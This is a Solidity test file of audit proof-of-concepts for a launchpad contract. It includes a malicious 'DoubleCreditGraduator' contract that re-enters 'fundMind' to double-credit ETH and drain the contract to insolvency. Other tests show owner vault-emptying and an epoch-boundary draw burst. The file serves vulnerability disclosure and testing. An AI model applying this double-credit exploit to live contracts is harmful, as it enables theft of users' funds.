// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {MindToken} from "../../src/MindToken.sol";
import {IGraduator} from "../../src/interfaces/IGraduator.sol";
import {IMindLaunchpad} from "../../src/interfaces/IMindLaunchpad.sol";
import {BaseTest} from "../utils/BaseTest.sol";

/// @notice Graduator that satisfies the launchpad's exact balance check by pushing the liquidity back through
///         `fundMind` (payable, not nonReentrant) and reporting it as `ethReturned`: the same wei is credited twice.
contract DoubleCreditGraduator is IGraduator {
    address public immutable launchpad;

    constructor(address launchpad_) {
        launchpad = launchpad_;
    }

    function graduate(address token, uint256) external payable returns (address, uint256, uint256) {
        IMindLaunchpad(launchpad).fundMind{value: msg.value}(token);
        return (address(this), 0, msg.value);
    }

    function harvest(address) external pure returns (uint256, uint256) {
        return (0, 0);
    }
}

/// @notice AUDIT PoCs for MindLaunchpad. Tests named test_POC_* assert the SAFE behaviour and FAIL on current code.
contract AuditLaunchpadTest is BaseTest {
    function _liabilities() internal view returns (uint256 total) {
        total = launchpad.protocolBalance();
        for (uint256 i; i < launchpad.mindsLength(); ++i) {
            address t = launchpad.mindAt(i);
            total += launchpad.getCurve(t).realEthReserve + launchpad.mindBalance(t);
        }
    }

    // ---------------------------------------------------------------------------------------------
    // M-1: the graduate/harvest balance check counts ETH that fundMind already credited
    // ---------------------------------------------------------------------------------------------

    function test_POC_M1_fundMindDuringGraduateDoubleCredits() public {
        // A live curve holding bob's ETH.
        address live = _createMind();
        uint256 bobTokens = _buy(bob, live, 2 ether);
        // A completed curve.
        address done = _createMind();
        _complete(alice, done);

        DoubleCreditGraduator evil = new DoubleCreditGraduator(address(launchpad));
        vm.prank(owner);
        launchpad.setGraduator(address(evil));
        launchpad.graduate(done); // passes the EthReturnMismatch check

        uint256 bal = address(launchpad).balance;
        uint256 liab = _liabilities();
        emit log_named_decimal_uint("launchpad ETH balance", bal, 18);
        emit log_named_decimal_uint("sum of liabilities", liab, 18);
        emit log_named_decimal_uint("phantom vault credit", liab > bal ? liab - bal : 0, 18);

        // The honest operator draws the (inflated) vault of `done` over the following days...
        uint256 drawnTotal;
        for (uint256 i; i < 40; ++i) {
            uint256 mb = launchpad.mindBalance(done);
            if (mb == 0) break;
            uint256 amt = mb < 0.25 ether ? mb : 0.25 ether;
            if (amt > address(launchpad).balance) amt = address(launchpad).balance; // drain to the last wei
            vm.prank(operator);
            launchpad.drawCompute(done, amt, bytes32(i));
            drawnTotal += amt;
            vm.warp(block.timestamp + 1 days);
            if (address(launchpad).balance == 0) break;
        }
        emit log_named_decimal_uint("ETH drawn from the inflated vault", drawnTotal, 18);
        emit log_named_decimal_uint("launchpad ETH left", address(launchpad).balance, 18);
        emit log_named_decimal_uint("bob's live-curve reserve", launchpad.getCurve(live).realEthReserve, 18);
        // ...after which bob can no longer sell on the live curve: the launchpad is insolvent.
        vm.startPrank(bob);
        MindToken(live).approve(address(launchpad), bobTokens);
        (bool ok,) =
            address(launchpad).call(abi.encodeCall(IMindLaunchpad.sell, (live, bobTokens, 0, block.timestamp)));
        vm.stopPrank();
        emit log_named_string("bob's sell on the live curve succeeded", ok ? "yes" : "no");

        // SPEC 2.3 invariant: balance >= sum(realEthReserve) + sum(mindBalance) + protocolBalance.
        assertGe(address(launchpad).balance, _liabilities(), "solvency invariant broken via fundMind double credit");
    }

    // ---------------------------------------------------------------------------------------------
    // L-2 (centralization): the owner can empty every mind vault in one block
    // ---------------------------------------------------------------------------------------------

    function test_POC_L2_ownerCanEmptyVaultsImmediately() public {
        address token = _createMind();
        vm.prank(alice);
        launchpad.fundMind{value: 10 ether}(token);
        uint256 vault = launchpad.mindBalance(token);
        uint256 ownerBefore = owner.balance;

        vm.startPrank(owner);
        launchpad.setOperator(owner);
        launchpad.setComputeTreasury(owner);
        launchpad.setDrawLimit(type(uint256).max, 3600);
        launchpad.drawCompute(token, vault, bytes32(0));
        vm.stopPrank();

        // README/SPEC: "nobody (creator, owner, operator) can withdraw it otherwise"; draws are "epoch-capped".
        assertEq(owner.balance - ownerBefore, 0, "owner pulled the whole vault in one block");
    }

    // ---------------------------------------------------------------------------------------------
    // I: fixed-window epoch lets the operator draw 2x maxPerEpoch within one second
    // ---------------------------------------------------------------------------------------------

    function test_POC_I_drawEpochBurst() public {
        address token = _createMind();
        vm.prank(alice);
        launchpad.fundMind{value: 1 ether}(token);
        vm.prank(operator);
        launchpad.drawCompute(token, 1, bytes32(0)); // opens the epoch
        (, uint64 start) = launchpad.drawnInEpoch(token);

        uint256 t0 = computeTreasury.balance;
        vm.warp(uint256(start) + 1 days - 1);
        vm.prank(operator);
        launchpad.drawCompute(token, 0.25 ether - 1, bytes32(0));
        vm.warp(uint256(start) + 1 days);
        vm.prank(operator);
        launchpad.drawCompute(token, 0.25 ether, bytes32(0));

        assertLe(computeTreasury.balance - t0, 0.25 ether, "drew 2x maxPerEpoch within one second");
    }
}
